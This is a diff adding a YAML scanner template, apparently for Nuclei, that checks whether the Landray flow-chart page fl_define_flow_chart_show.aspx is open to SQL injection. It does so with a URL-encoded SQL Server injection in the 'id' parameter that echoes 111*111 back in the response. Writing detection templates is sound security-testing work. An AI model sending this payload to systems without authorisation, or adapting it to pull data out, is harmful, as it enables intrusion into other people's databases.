@@ -1,0 +1,17 @@
+http:
+    - matchers:
+        - dsl:
+            - contains(body,"12321")
+          type: dsl
+      matchers-condition: and
+      raw:
+        - |
+          GET /flow/fl_define_flow_chart_show.aspx?id=1%20AND%205367%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1
+          Host: {{Hostname}}
+          TestHead: TestValue
+id: landray-fl_define_flow_chart_show-sqli
+info:
+    author: landray-fl_define_flow_chart_show-sqli
+    name: landray-fl_define_flow_chart_show-sqli
+    severity: high
+    tags: []
